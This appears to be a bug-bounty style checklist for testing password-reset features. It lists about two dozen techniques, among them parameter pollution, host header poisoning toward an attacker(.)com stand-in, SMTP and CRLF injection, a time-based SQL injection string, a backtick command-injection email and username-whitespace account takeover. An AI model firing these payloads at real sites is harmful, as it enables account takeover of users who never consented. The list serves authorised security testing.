# Testing-forget-Password-

1. Host Header Injection - Password Reset Poisoning
2. HPP:
email=v@g.com&email=a@g.com
email[]=v@g.com&email[]=a@g.com
email=v@g.com%20email=a@g.com
email=v@g.com|email=a@g.com
email=v@g.com,a@g.com
email=v@g.com%20a@g.com
{"email":"v@g.com","email":"a@g.com"}
{"email":["v@g.com","a@g.com"]}
3. IDOR
4. Broken Crypto
5. Password reset token Leakage via referral header
6. Token leakage in response/JS files.
7. Session/Token is not expiring after password reset.
8. Add only space in password.
9. Ask for 2 password reset links and try the older one
10. SMTP Injection: v@g.com%0d%0aCC%3aa@g.com%0d%0a
11. Use paramminer to discover additional parameters(or append previously known parameters) in the request. Now try IDOR.
12. Try:
POST https://attacker(.)com/resetpassword.php HTTP/1.1
POST 
@attacker
.com/resetpassword.php HTTP/1.1
POST :
@attacker
.com/resetpassword.php HTTP/1.1
POST /resetpassword.php@attacker.com HTTP/1.1
13. SQLi: test@test.com'+(select*from(select(sleep(2)))a)+'
14. Append a .json after the endpoint.
15. CRLF: /resetpassword?%0d%0aHost:%20attacker(.)com
16. Register with a username identical to the victim's username, but with white spaces inserted before and/or after the username("tuhin1729 ", " tuhin1729 " etc). Try a password reset for your account. Use the token to reset victim's password. Ex: CVE-2020-7245
17. DoS
18. If they are sending an otp for password reset, try 2fa bypass techniques.
19. During registration, use homograph in email. Now try password reset.
20. Change the request method and content-type and observer how the application is responding.
22. Try XSS, SSTI etc in the email field.
23. Try Command injection by email=hello@`whoami`.xyz.burpcollaborator.net
24. 2FA auto disabled after password reset.
25. User Enumeration
26. Check whether any param value is reflecting in the email. Now try HTMLi.
